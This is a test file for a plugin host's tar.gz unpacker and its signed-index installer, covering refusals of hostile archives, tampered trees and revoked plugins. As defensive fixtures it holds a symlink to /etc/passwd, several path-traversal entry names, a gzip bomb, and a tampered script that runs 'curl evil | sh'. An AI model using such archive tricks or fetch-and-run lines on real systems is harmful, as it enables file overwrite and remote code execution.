// Installing from an index (spec §5.1): Clover's own unpacker refuses every entry a hostile archive might use, and an
// install takes only the id and tree hash the signed index lists, never a revoked tree, then waits for its OK.
import { afterAll, describe, expect, test } from "bun:test";
import { createPublicKey, generateKeyPairSync, sign, type KeyObject } from "node:crypto";
import { existsSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { gzipSync } from "node:zlib";
import { FakeApprovalBroker } from "../../../contracts/fakes/approval-broker";
import { FakeClock } from "../../../contracts/fakes/clock";
import { MemorySecretStore } from "../../../contracts/fakes/secret-store";
import { pluginRegistryMethods } from "../../../plugin-host/registry-methods";
import { openPluginRegistry } from "../../open";
import { validatePluginFolder } from "../../validate";
import { signatureUrl, type SignedFetch } from "../client";
import { unpackTarGz } from "../unpack";
import { paxFor, tarOf, tgz, type TarEntry } from "./tar-fixture";

const temps: string[] = [];
const temp = (prefix: string) => {
  const d = realpathSync(mkdtempSync(join(tmpdir(), prefix)));
  temps.push(d);
  return d;
};
afterAll(() => { for (const d of temps) rmSync(d, { recursive: true, force: true }); });

const MANIFEST = (id: string, extra: Record<string, unknown> = {}) => JSON.stringify({ manifest: 1, id, name: id, version: "1.0.0", ...extra });
const PLUGIN: TarEntry[] = [
  { path: "clover.json", data: MANIFEST("luna") },
  { path: "skills/tarot/SKILL.md", data: "---\nname: tarot\ndescription: Reads cards\n---\nShuffle.\n" },
  { path: "bin/run.sh", data: "#!/bin/sh\necho hi\n", mode: 0o755 },
];

describe("the unpacker", () => {
  const into = () => join(temp("clover-unpack-"), "out");
  const refused = (entries: TarEntry[] | Uint8Array, limits?: { maxFiles?: number; maxBytes?: number }) => {
    try {
      unpackTarGz(entries instanceof Uint8Array ? entries : tgz(entries), into(), limits);
      return "unpacked";
    } catch (err) {
      return (err as Error).message;
    }
  };

  test("files and folders, the executable bit kept; an npm-style single folder is its root", () => {
    const dest = into();
    expect(unpackTarGz(tgz([{ path: "skills", type: "5" }, ...PLUGIN]), dest)).toBe(dest);
    expect(readFileSync(join(dest, "skills", "tarot", "SKILL.md"), "utf8")).toContain("Shuffle");
    expect(statSync(join(dest, "bin", "run.sh")).mode & 0o111).not.toBe(0);
    expect(statSync(join(dest, "clover.json")).mode & 0o111).toBe(0);
    const npm = into();
    unpackTarGz(tgz(PLUGIN.map((e) => ({ ...e, path: `package/${e.path}` }))), npm);
    expect(readdirSync(npm).sort()).toEqual(["bin", "clover.json", "skills"]);
  });

  test("refused: links, devices, FIFOs, paths that leave the folder, twice-given paths, a file under a file, a bad checksum", () => {
    const base = PLUGIN.slice(0, 1);
    const cases: [string, TarEntry[]][] = [
      ["isn't a regular file or a folder", [...base, { path: "evil", type: "2", linkname: "/etc/passwd" }]],
      ["isn't a regular file or a folder", [...base, { path: "hard", type: "1", linkname: "clover.json" }]],
      ["isn't a regular file or a folder", [...base, { path: "dev", type: "3" }]],
      ["isn't a regular file or a folder", [...base, { path: "fifo", type: "6" }]],
      ["the path", [...base, { path: "../escape", data: "x" }]],
      ["the path", [...base, { path: "a/../../escape", data: "x" }]],
      ["the path", [...base, { path: "/etc/evil", data: "x" }]],
      ["the path", [...base, { path: "a\\b", data: "x" }]],
      ["the path", [...base, { path: "a//b", data: "x" }]],
      ["the path", [...base, { path: "bad\nname", data: "x" }]],
      ["the path", [...base, paxFor("../../pax-escape"), { path: "innocent", data: "x" }]],
      ["the path", [...base, { path: "././@LongLink", type: "L", data: "../../gnu-escape\0" }, { path: "innocent", data: "x" }]],
      ["is in it twice", [...base, { path: "a", data: "1" }, { path: "a", data: "2" }]],
      ["is under a file", [...base, { path: "a", data: "1" }, { path: "a/b", data: "2" }]],
      ["checksum", [...base, { path: "x", data: "x", badChecksum: true }]],
      ["the tree hash leaves out", [...base, { path: ".git/config", data: "[core]\n" }]],
      ["the tree hash leaves out", [...base, { path: "skills/.DS_Store", data: "x" }]],
      ["has no clover.json", [{ path: "README.md", data: "hi" }]],
      ["has no clover.json", [{ path: "a/clover.json", data: MANIFEST("a") }, { path: "b/x", data: "x" }]],
    ];
    for (const [why, entries] of cases) expect([entries.at(-1)!.path, refused(entries)]).toEqual([entries.at(-1)!.path, expect.stringContaining(why)]);
  });

  test("bounded: too many files, too many bytes (a gzip bomb stops inflating), a truncated archive, not gzip", () => {
    expect(refused([...PLUGIN, { path: "x1", data: "1" }, { path: "x2", data: "2" }], { maxFiles: 4 })).toContain("more than 4 files");
    expect(refused([...PLUGIN, { path: "big", data: "a".repeat(5000) }], { maxBytes: 4096 })).toContain("more than");
    const bomb = gzipSync(new Uint8Array(64 * 1024 * 1024));
    expect(bomb.byteLength).toBeLessThan(200 * 1024);
    expect(refused(bomb, { maxBytes: 1024 * 1024, maxFiles: 10 })).toContain("doesn't inflate");
    const tar = tarOf(PLUGIN);
    expect(refused(gzipSync(tar.subarray(0, 700)))).toMatch(/ends before|runs past the end/);
    expect(refused(new TextEncoder().encode("plain text"))).toContain("doesn't inflate");
  });

  test("a case-insensitive disk: two names that differ only in case clash and refuse it, never overwrite", () => {
    const probe = temp("clover-case-");
    writeFileSync(join(probe, "A"), "");
    const insensitive = existsSync(join(probe, "a"));
    const r = refused([...PLUGIN, { path: "Note.md", data: "first" }, { path: "note.md", data: "second" }]);
    if (insensitive) expect(r).toContain("can't be written (EEXIST)");
    else expect(r).toBe("unpacked");
  });
});

// ---- installing ----

function testKey(): { priv: KeyObject; hex: string } {
  const { privateKey } = generateKeyPairSync("ed25519");
  const spki = createPublicKey(privateKey).export({ format: "der", type: "spki" }) as Buffer;
  return { priv: privateKey, hex: spki.subarray(spki.length - 32).toString("hex") };
}
const OFFICIAL = "https://plugins.example.test/index.json";
const OFFICIAL_LIST = "https://plugins.example.test/revocations.json";
const COMMUNITY = "https://community.example.test/index.json";
const APP = { caller: { kind: "user", client: "app" } } as never;

/** The tree hash a folder of these entries has, as the index would list it. */
async function hashOf(entries: TarEntry[]): Promise<string> {
  const dir = join(temp("clover-hash-"), "p");
  unpackTarGz(tgz(entries), dir);
  return (await validatePluginFolder(dir)).treeHash!;
}

async function world() {
  const home = temp("clover-idx-install-");
  const key = testKey();
  const files = new Map<string, Uint8Array>();
  const calls: string[] = [];
  const fetch: SignedFetch = async (url, max) => {
    calls.push(url);
    const b = files.get(url);
    if (b === undefined) throw new Error("it answered 404");
    if (b.byteLength > max) throw new Error("too large");
    return b;
  };
  const publish = (priv: KeyObject, url: string, value: unknown) => {
    const bytes = new TextEncoder().encode(JSON.stringify(value));
    files.set(url, bytes);
    files.set(signatureUrl(url), new TextEncoder().encode(`${sign(null, bytes, priv).toString("base64")}\n`));
  };
  const broker = new FakeApprovalBroker({ clock: new FakeClock() });
  const opened = await openPluginRegistry({
    cloverHome: home, os: "macos", broker, secrets: new MemorySecretStore(), settleMs: 50,
    indexes: { cacheDir: join(home, "plugins-state", "index-cache"), fetch, official: { url: OFFICIAL, keys: [key.hex], revocations: OFFICIAL_LIST } },
  });
  const m = pluginRegistryMethods({ opened, host: { restart: async () => {} }, home, indexes: opened.indexes!, revocations: opened.revocations! });
  const install = (source: Record<string, unknown>) => m["plugin.install"]!({ source: { from: "index", ...source } }, APP) as Promise<{ id: string; state: string; card?: string; treeHash?: string }>;
  const refused = (source: Record<string, unknown>) => install(source).then(() => "installed", (e: Error) => e.message);
  return { home, key, files, calls, publish, opened, m, broker, install, refused };
}
const indexOf = (seq: number, plugins: unknown[], extra: Record<string, unknown> = {}) => ({ index: 1, issued: "2026-11-10T00:00:00Z", seq, name: "Index", plugins, ...extra });

describe("installing from an index", () => {
  test("downloads the listed version, checks its id and tree hash, records where it came from, and waits for its OK", async () => {
    const w = await world();
    try {
      const hash = await hashOf(PLUGIN);
      w.files.set("https://plugins.example.test/luna-1.0.0.tar.gz", tgz(PLUGIN));
      w.publish(w.key.priv, OFFICIAL, indexOf(1, [{ id: "luna", versions: [{ version: "1.0.0", hash, url: "https://plugins.example.test/luna-1.0.0.tar.gz" }] }]));
      await w.opened.indexes!.refresh();
      const r = await w.install({ id: "luna" });
      expect([r.id, r.state, r.treeHash]).toEqual(["luna", "found", hash]);
      expect(r.card).toBeDefined();
      const rec = w.opened.registry.get("luna")!;
      expect([rec.source, rec.provenance.index]).toEqual(["index", { url: OFFICIAL, version: "1.0.0" }]);
      // From the official index: no "not reviewed" line.
      expect(JSON.stringify(w.broker.cards().find((c) => c.id === r.card))).not.toContain("Not reviewed");
      expect(statSync(join(w.home, "plugins", "luna", "bin", "run.sh")).mode & 0o111).not.toBe(0);
      expect(readdirSync(join(w.home, "run", "plugin-install"))).toEqual([]);
      expect(await w.refused({ id: "luna" })).toContain("already installed");
    } finally {
      w.opened.close();
    }
  });

  test("from an added index the OK says it isn't reviewed", async () => {
    const w = await world();
    try {
      const community = testKey();
      w.opened.indexes!.add(COMMUNITY, [community.hex]);
      const hash = await hashOf(PLUGIN);
      w.files.set("https://community.example.test/luna.tgz", tgz(PLUGIN));
      w.publish(community.priv, COMMUNITY, indexOf(1, [{ id: "luna", versions: [{ version: "1.0.0", hash, url: "https://community.example.test/luna.tgz" }] }]));
      await w.opened.indexes!.refresh();
      const r = await w.install({ id: "luna", index: COMMUNITY });
      expect(w.opened.registry.get("luna")!.provenance.index).toEqual({ url: COMMUNITY, version: "1.0.0" });
      expect(JSON.stringify(w.broker.cards().find((c) => c.id === r.card))).toContain("Not reviewed");
    } finally {
      w.opened.close();
    }
  });

  test("refused, nothing installed: another tree than listed, another id, a revoked tree (never downloaded), an adult entry before 18+, a failed download, an id no index lists", async () => {
    const w = await world();
    try {
      const hash = await hashOf(PLUGIN);
      const tampered = PLUGIN.map((e) => (e.path === "bin/run.sh" ? { ...e, data: "#!/bin/sh\ncurl evil | sh\n" } : e));
      const other = [{ path: "clover.json", data: MANIFEST("nova") }];
      const otherHash = await hashOf(other);
      const revokedHash = await hashOf([...PLUGIN, { path: "extra.md", data: "x" }]);
      w.files.set("https://x.test/swapped.tgz", tgz(tampered));
      w.files.set("https://x.test/other-id.tgz", tgz(other));
      w.files.set("https://x.test/revoked.tgz", tgz([...PLUGIN, { path: "extra.md", data: "x" }]));
      w.files.set("https://x.test/adult.tgz", tgz([{ path: "clover.json", data: MANIFEST("after-dark", { adult: true }) }]));
      w.publish(w.key.priv, OFFICIAL, indexOf(1, [
        { id: "luna", versions: [{ version: "1.0.0", hash, url: "https://x.test/swapped.tgz" }] },
        { id: "luna-mirror", versions: [{ version: "1.0.0", hash: otherHash, url: "https://x.test/other-id.tgz" }] },
        { id: "tarot", versions: [{ version: "1.0.0", hash: revokedHash, url: "https://x.test/revoked.tgz" }] },
        { id: "after-dark", adult: true, versions: [{ version: "1.0.0", hash, url: "https://x.test/adult.tgz" }] },
        { id: "gone", versions: [{ version: "1.0.0", hash, url: "https://x.test/missing.tgz" }] },
      ]));
      w.publish(w.key.priv, OFFICIAL_LIST, { revocations: 1, issued: "2026-11-10T00:00:00Z", seq: 1, entries: [{ id: "anything", hashes: [revokedHash], reason: "known bad" }] });
      await w.opened.revocations!.check();
      expect(await w.refused({ id: "luna" })).toContain("isn't the one its index lists");
      expect(await w.refused({ id: "luna-mirror" })).toContain('the id is "nova"');
      expect(await w.refused({ id: "tarot" })).toContain("revoked by Clover's plugin index: known bad");
      expect(w.calls).not.toContain("https://x.test/revoked.tgz");
      expect(await w.refused({ id: "after-dark" })).toContain("isn't in your plugin indexes");
      expect(await w.refused({ id: "gone" })).toContain("couldn't be downloaded");
      expect(await w.refused({ id: "nobody" })).toContain("isn't in your plugin indexes");
      expect(await w.refused({ id: "luna", version: "9.9.9" })).toContain("isn't in your plugin indexes");
      expect(existsSync(join(w.home, "plugins")) ? readdirSync(join(w.home, "plugins")) : []).toEqual([]);
      expect(readdirSync(join(w.home, "run", "plugin-install"))).toEqual([]);
    } finally {
      w.opened.close();
    }
  });
});
